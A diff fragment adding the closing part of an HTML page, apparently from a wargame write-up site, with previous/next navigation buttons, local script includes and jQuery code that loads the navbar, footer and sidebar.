+    <section class="" role="group">
+      <button id="previous" onClick="location.href='leviathan.html'"> Previous </button>
+      <button id="next" onClick="location.href='bandit.html'"> Next </button>
+      <br> <br> <br>
+    </section>
+
+
+    </div>
+  </main>
+
+  <!-- Footer -->
+  <div id="include_footer"></div>
+
+  <script type="text/javascript" src="/fonts/fontawesome.js"></script>
+  <script type="text/javascript" src="/res/bootstrap.min.js"></script>
+  <script type="text/javascript" src="/res/jquery-3.4.1.js"></script>
+  <script type="text/javascript" src="/js/jquery.touchSwipe.min.js"></script>
+  <script type="text/javascript" src="/js/sidebar.js"> </script>
+  <script type="text/javascript" src="/js/return_to_top_arrow.js"></script>
+  <script type="text/javascript" src="/res/prism_themes/prism_lb.js"></script>
+
+  <!-- Import HTML -->
+  <script>
+    // import navbar
+    $("#include_navbar").load("/html_import/navbar.html", function(){
+
+      // function to activate the hamburger menu
+      $('.menu-toggle').click(function(){
+        $('nav').toggleClass('active');
+      });
+    });
+
+    // import footer
+    $(function(){
+      $("#include_footer").load("/html_import/footer.html");
+    });
+
+    // import sidebar
+    $(function(){
+      $("#include_sidebar").load("../../html/sidebar.html");
+    });
+  </script>
+
+</body>
+
+</html>
